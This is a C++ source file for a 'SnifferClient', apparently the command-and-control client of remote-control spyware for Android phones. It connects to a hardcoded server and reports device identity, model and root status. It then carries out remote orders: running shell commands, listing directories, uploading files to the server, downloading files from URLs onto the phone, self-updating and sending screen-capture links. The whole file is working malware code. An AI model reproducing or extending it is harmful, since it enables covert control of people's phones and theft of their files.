/*
 * SnifferClient.cpp
 *
 *  Created on: 2014年3月9日
 *      Author: Kingsley Yau
 *      Email: Kingsleyyau@gmail.com
 */

#include "SnifferClient.h"

/*
 * 监听线程
 */
class SnifferClientRunnable : public KRunnable {
public:
	SnifferClientRunnable(SnifferClient *pSnifferClient) {
		mpSnifferClient = pSnifferClient;
	}
	virtual ~SnifferClientRunnable() {
		mpSnifferClient = NULL;
	}
protected:
	void onRun() {
		if( mpSnifferClient != NULL ) {
			mpSnifferClient->HandleSnifferClientRunnable();
		}
	}
private:
	SnifferClient *mpSnifferClient;
};

SnifferClient::SnifferClient() {
	// TODO Auto-generated constructor stub
	mpSnifferClientRunnable = new SnifferClientRunnable(this);

	mServerAddress = ServerAdess;
	miServerPort = ServerPort;

	mbRunning = false;
}

SnifferClient::~SnifferClient() {
	// TODO Auto-generated destructor stub
	if( mpSnifferClientRunnable ) {
		delete mpSnifferClientRunnable;
		mpSnifferClientRunnable = NULL;
	}
}

void SnifferClient::SetSnifferClientCallback(SnifferClientCallback *pSnifferClientCallback) {
	mpSnifferClientCallback = pSnifferClientCallback;
}

bool SnifferClient::Start() {
	bool bFlag = false;

	if( !mbRunning ) {
		mbRunning = true;

		if( -1 != mKThread.start(mpSnifferClientRunnable) ) {
			bFlag = true;
		} else {
			mbRunning = false;
		}
	}
	return bFlag;
}

void SnifferClient::Stop() {
	mbRunning = false;
	mTcpSocket.Close();
	mKThread.stop();
}

bool SnifferClient::ConnectServer() {
	bool bFlag = false;

	int iRet = mTcpSocket.Connect(mServerAddress.c_str(), miServerPort, true);
	if(iRet > 0) {
		bFlag = true;

		mSendMutex.lock();
		mSendSeq = 0;
		mSendMutex.unlock();
	}

	return bFlag;
}

void SnifferClient::HandleSnifferClientRunnable() {
	Json::Value root;
	Json::FastWriter writer;
	string param;

	SCMD scmd;
	int seq = 0;

	while( mbRunning ) {
		FileLog(
				SnifferLogFileName,
				"SnifferClient::HandleSnifferClientRunnable( 等待连接服务端 )"
				);

		if( ConnectServer() ) {
			if( mpSnifferClientCallback != NULL ) {
				mpSnifferClientCallback->OnConnected(this);
			}

			char deviceId[128] = {'\0'};
			memset(deviceId, '\0', sizeof(deviceId));
			list<IpAddressNetworkInfo> infoList = IPAddress::GetNetworkInfoList();
			if( infoList.size() > 0 && infoList.begin() != infoList.end() ) {
				IpAddressNetworkInfo info = *(infoList.begin());
				GetMD5String(info.mac.c_str(), deviceId);
			}

			// 连接上服务端, 发送手机型号/手机号
			FileLog(
					SnifferLogFileName,
					"SnifferClient::HandleSnifferClientRunnable( "
					"已经连接上服务端, 发送手机信息, "
					"DeviceId : %s, "
					"厂商 : %s, "
					"型号 : %s, "
					"ABI : %s, "
					"手机号 : %s "
					")",
					deviceId,
					GetPhoneBrand().c_str(),
					GetPhoneModel().c_str(),
					GetPhoneCpuAbi().c_str(),
					""
					);

			root.clear();
			root[DEVICE_ID] = deviceId;
			root[VERSION] = SnifferVersion;
			root[PHONE_INFO_BRAND] = GetPhoneBrand();
			root[PHONE_INFO_MODEL] = GetPhoneModel();
			root[PHONE_INFO_ABI] = GetPhoneCpuAbi();
			root[PHONE_INFO_NUMBER] = "";
			root[IS_ROOT] = IsRoot();

			param = writer.write(root);

			bzero(&scmd, sizeof(SCMD));
			scmd.header.scmdt = SnifferTypeClientInfo;
			scmd.header.bNew = true;
			scmd.header.seq = seq++;
			scmd.header.len = MIN(param.length(), MAX_PARAM_LEN - 1);
			memcpy(scmd.param, param.c_str(), param.length());
			scmd.param[scmd.header.len] = '\0';
			SendCommand(scmd);

			FileLog(SnifferLogFileName, "SnifferClient::HandleSnifferClientRunnable( 等待接收命令  )");

			bool bCanRecv = true;
			while(bCanRecv) {
				// 开始接收命令
				SCMD scmd;
				bCanRecv = RecvCommand(scmd);
				if( bCanRecv ) {
					OnRecvCommand(scmd);
				} else {
					// 与服务端连接已经断开
					FileLog(SnifferLogFileName, "SnifferClient::HandleSnifferClientRunnable( 与服务端连接已经断开 )");
					if( mpSnifferClientCallback != NULL ) {
						mpSnifferClientCallback->OnDisConnected(this);
					}

					break;
				}
			}
		}
		sleep(10);
	}
}

bool SnifferClient::RecvCommand(SCMD &scmd) {
	bool bFlag = false;
	bzero(&scmd, sizeof(SCMD));
	scmd.header.scmdt = SinfferTypeNone;

	// 接收命令头
	char HeadBuffer[sizeof(SCMDH) + 1] = {'\0'};
	int len = mTcpSocket.RecvData(HeadBuffer, sizeof(SCMDH));
	if(len == sizeof(SCMDH)) {
		// 接收头成功
		memcpy(&scmd.header, HeadBuffer, sizeof(SCMDH));

		if( scmd.header.len > 0 ) {
			len = mTcpSocket.RecvData(scmd.param, scmd.header.len);
			if( len == scmd.header.len ) {
				// 接收参数成功
				scmd.param[scmd.header.len] = '\0';
				bFlag = true;
			}

		} else {
			// 没有参数
			bFlag = true;
		}
	}

	FileLog(
			SnifferLogFileName,
			"SnifferClient::RecvCommand( "
			"scmd.header.scmdt : %d, "
			"scmd.header.seq : %d, "
			"scmd.header.bNew : %s, "
			"scmd.header.len : %d, "
			"scmd.param : %s, "
			"bFlag : %s "
			")",
			scmd.header.scmdt,
			scmd.header.seq,
			scmd.header.bNew?"true":"false",
			scmd.header.len,
			scmd.param,
			bFlag?"true":"false"
			);

	return bFlag;
}

void SnifferClient::OnRecvCommand(const SCMD &scmd) {
	switch(scmd.header.scmdt) {
	case ExcuteCommand:{
		// 执行Shell命令
		HandleRecvCmdExcuteCommand(scmd);
	}break;
	case SnifferListDir:{
		// 列目录
		HandleRecvCmdSnifferListDir(scmd);

	}break;
	case SinfferTypeStart:{
		// 开始监听

	}break;
	case SinfferTypeStop:{
		// 停止监听

	}break;
	case SnifferUploadFile:{
		// 上传文件
		HandleRecvCmdSnifferUploadFile(scmd);

	}break;
	case SnifferDownloadFile:{
		// 下载文件
		HandleRecvCmdSnifferDownloadFile(scmd);

	}break;
	case SnifferCheckUpdate:{
		// 更新客户端
		HandleRecvCmdSnifferCheckUpdate(scmd);

	}break;
	case SinfferTypeNone:{
		// 与服务端连接已经断开

	}break;
	default:break;
	}
}

void SnifferClient::HandleRecvCmdExcuteCommand(const SCMD &scmd) {
	// 执行命令
	string cmd = scmd.param;

	FileLog(SnifferLogFileName, "SnifferClient::HandleRecvCmdExcuteCommand( "
			"[收到命令:执行命令], "
			"cmd : %s"
			" )",
			cmd.c_str()
			);

	if( mpSnifferClientCallback != NULL ) {
		mpSnifferClientCallback->OnRecvCmdExcuteCommand(this, scmd.header.seq, cmd);
	}
}

void SnifferClient::HandleRecvCmdSnifferListDir(const SCMD &scmd) {
	// 列目录
	Json::FastWriter writer;
	Json::Value rootSend;
	string result;

    Json::Reader reader;
    Json::Value rootRecv;
    reader.parse(scmd.param, rootRecv);

    int index = 0;
    if( rootRecv[COMMON_PAGE_INDEX].isInt() ) {
    	index = rootRecv[COMMON_PAGE_INDEX].asInt();
    }

    int size = 0;
    if( rootRecv[COMMON_PAGE_SIZE].isInt() ) {
    	size = rootRecv[COMMON_PAGE_SIZE].asInt();
    }

    string dir = "";
    if( rootRecv[DIRECTORY].isString() ) {
    	dir = rootRecv[DIRECTORY].asString();
    }

	FileLog(SnifferLogFileName, "SnifferClient::HandleRecvCmdSnifferListDir( "
			"[收到命令:列目录], "
			"dir : %s, "
			"index : %d, "
			"size : %d"
			" )",
			dir.c_str(),
			index,
			size
			);

	if( mpSnifferClientCallback != NULL ) {
		mpSnifferClientCallback->OnRecvCmdSnifferListDir(this, scmd.header.seq, dir, index, size);
	}
}

void SnifferClient::HandleRecvCmdSnifferUploadFile(const SCMD &scmd) {
	// 上传文件到服务器
	string filePath = scmd.param;

	FileLog(SnifferLogFileName, "SnifferClient::HandleRecvCmdSnifferUploadFile( "
			"[收到命令:上传文件到服务器], "
			"filePath : %s"
			" )",
			filePath.c_str()
			);

	if( mpSnifferClientCallback != NULL ) {
		mpSnifferClientCallback->OnRecvCmdSnifferUploadFile(this, scmd.header.seq, filePath);
	}
}

void SnifferClient::HandleRecvCmdSnifferDownloadFile(const SCMD &scmd) {
	// 下载文件到客户端
    Json::Reader reader;
    Json::Value rootRecv;
    reader.parse(scmd.param, rootRecv);

    // 地址
    string url = "";
    if( rootRecv[URL].isString() ) {
    	url = rootRecv[URL].asString();
    }

    // 文件路径
    string filePath = "";
    if( rootRecv[FILEPATH].isString() ) {
    	filePath = rootRecv[FILEPATH].asString();
    }

	FileLog(SnifferLogFileName, "SnifferClient::HandleRecvCmdSnifferDownloadFile( "
			"[收到命令:下载文件到客户端], "
			"url : %s, "
			"filePath : %s"
			" )",
			url.c_str(),
			filePath.c_str()
			);

	if( mpSnifferClientCallback != NULL ) {
		mpSnifferClientCallback->OnRecvCmdSnifferDownloadFile(this, scmd.header.seq, url, filePath);
	}
}

void SnifferClient::HandleRecvCmdSnifferCheckUpdate(const SCMD &scmd) {
	// 更新客户端
    Json::Reader reader;
    Json::Value rootRecv;
    reader.parse(scmd.param, rootRecv);

    // 地址
    string url = "";
    if( rootRecv[CLIENT_UPDATE_URL].isString() ) {
    	url = rootRecv[CLIENT_UPDATE_URL].asString();
    }

    // 文件路径
    string version = "";
    if( rootRecv[CLIENT_UPDATE_VERSION].isString() ) {
    	version = rootRecv[CLIENT_UPDATE_VERSION].asString();
    }

	FileLog(SnifferLogFileName, "SnifferClient::HandleRecvCmdSnifferCheckUpdate( "
			"[收到命令:更新客户端], "
			"url : %s, "
			"version : %s"
			" )",
			url.c_str(),
			version.c_str()
			);

	if( mpSnifferClientCallback != NULL ) {
		mpSnifferClientCallback->OnRecvCmdSnifferCheckUpdate(this, scmd.header.seq, url, version);
	}
}

bool SnifferClient::SendCmdExcuteCommand(bool bFlag, int seq, const string& result) {
	FileLog(
			SnifferLogFileName,
			"SnifferClient::SendCmdExcuteCommand( "
			"[发送命令:执行命令结果], "
			"bFlag : %s, "
			"seq : %d, "
			"result : %s"
			" )",
			bFlag?"true":"false",
					seq,
			result.c_str()
			);

	SCMD scmdSend;
	scmdSend.header.scmdt = ExcuteCommand;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	scmdSend.param[scmdSend.header.len] = '\0';
	return SendCommand(scmdSend);
}

bool SnifferClient::SendCmdSnifferListDir(bool bFlag, int seq, const list<FileStruct>& itemList, int iTotal) {
	FileLog(
			SnifferLogFileName,
			"SnifferClient::SendCmdExcuteCommand( "
			"[发送命令:列目录结果], "
			"bFlag : %s, "
			"seq : %d, "
			"iTotal : %d"
			" )",
			bFlag?"true":"false",
			seq,
			iTotal
			);

	Json::FastWriter writer;
	Json::Value rootSend;

	rootSend[COMMON_RET] = bFlag?1:0;
	if( bFlag ) {
		for(list<FileStruct>::const_iterator itr = itemList.begin(); itr != itemList.end(); itr++) {
			Json::Value item;
			item[D_NAME] = itr->name;
			item[D_MODE] = itr->mode;
			item[D_TYPE] = itr->type;
			item[D_SIZE] = itr->st_size;
			rootSend[FILE_LIST].append(item);
		}

		rootSend[COMMON_TOTAL] = iTotal;
	}

	string result;
	result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferListDir;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	return SendCommand(scmdSend);
}

bool SnifferClient::SendCmdSnifferUploadFile(bool bFlag, int seq, const string& website, const string& filePath) {
	FileLog(
			SnifferLogFileName,
			"SnifferClient::SendCmdSnifferUploadFile( "
			"[发送命令:上传文件结果], "
			"bFlag : %s, "
			"seq : %d, "
			"website : %s, "
			"filePath : %s"
			" )",
			bFlag?"true":"false",
			seq,
			website.c_str(),
			filePath.c_str()
			);

	Json::FastWriter writer;
	Json::Value rootSend;

	rootSend[COMMON_RET] = bFlag?1:0;
	if( bFlag ) {
		if( website.length() > 0 ) {
			rootSend[DOWN_SERVER_ADDRESS] = website;
		}

		if( filePath.length() > 0 ) {
			rootSend[FILEPATH] = filePath;
		}
	}

	string result;
	result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferUploadFile;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	return SendCommand(scmdSend);
}

bool SnifferClient::SendCmdSnifferDownloadFile(bool bFlag, int seq, const string& filePath) {
	FileLog(
			SnifferLogFileName,
			"SnifferClient::SendCmdSnifferDownloadFile( "
			"[发送命令:下载文件结果], "
			"bFlag : %s, "
			"seq : %d, "
			"filePath : %s"
			" )",
			bFlag?"true":"false",
			seq,
			filePath.c_str()
			);

	Json::FastWriter writer;
	Json::Value rootSend;
	rootSend[COMMON_RET] = bFlag?1:0;
	if( bFlag ) {
		if( filePath.length() > 0 ) {
			rootSend[FILEPATH] = filePath;
		}
	}

	string result;
	result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferDownloadFile;
	scmdSend.header.bNew = false;
	scmdSend.header.seq = seq;
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	return SendCommand(scmdSend);
}

bool SnifferClient::SendCmdSnifferScreenCapUpdate(const string& url) {
	FileLog(
			SnifferLogFileName,
			"SnifferClient::SendCmdSnifferScreenCapUpdate( "
			"[发送命令:截屏更新], "
			"url : %s"
			" )",
			url.c_str()
			);

	Json::FastWriter writer;
	Json::Value rootSend;
	if( url.length() > 0 ) {
		rootSend[CLIENT_SCREENCAP_URL] = url;
	}

	string result;
	result = writer.write(rootSend);

	SCMD scmdSend;
	scmdSend.header.scmdt = SnifferScreenCapUpdate;
	scmdSend.header.bNew = true;
	mSendMutex.lock();
	scmdSend.header.seq = mSendSeq++;
	mSendMutex.unlock();
	scmdSend.header.len = MIN(result.length(), MAX_PARAM_LEN - 1);
	memcpy(scmdSend.param, result.c_str(), scmdSend.header.len);
	return SendCommand(scmdSend);
}

bool SnifferClient::SendCommand(const SCMD &scmd) {
	FileLog(
			SnifferLogFileName,
			"SnifferClient::SendCommand( "
			"scmd.header.scmdt : %d, "
			"scmd.header.seq : %d, "
			"scmd.header.bNew : %s, "
			"scmd.header.len : %d, "
			"scmd.param : %s "
			")",
			scmd.header.scmdt,
			scmd.header.seq,
			scmd.header.bNew?"true":"false",
			scmd.header.len,
			scmd.param
			);

	bool bFlag = false;

	// 发送命令
	int iLen = sizeof(SCMDH) + scmd.header.len;
	int iSend = mTcpSocket.SendData((char *)&scmd, iLen);
	if( iSend == iLen ) {
		bFlag = true;
	}

	return bFlag;
}
